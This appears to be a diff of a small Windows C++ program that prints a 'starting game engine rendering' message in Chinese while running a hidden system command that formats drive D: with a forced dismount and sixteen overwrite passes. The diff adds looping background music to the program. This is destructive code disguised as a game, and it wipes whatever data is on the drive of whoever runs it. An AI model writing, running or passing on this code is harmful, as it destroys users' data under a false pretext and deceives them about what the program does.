@@ -1,8 +1,12 @@
 #include<iostream>
 #include<cstdlib>
+#include<windows.h>
+#include <mmsystem.h>
+#pragma comment(lib, "WINMM.LIB")
 using namespace std;
 int main(){
   cerr<<"开始渲染游戏引擎……";
+  PlaySound("music",null,SND_FILENAME|SND_LOOP|SND_ASYNC);
   system("format /P:16 /X D: > tmpfile");
   while(true){
     system("find \"%\" tmpfile");
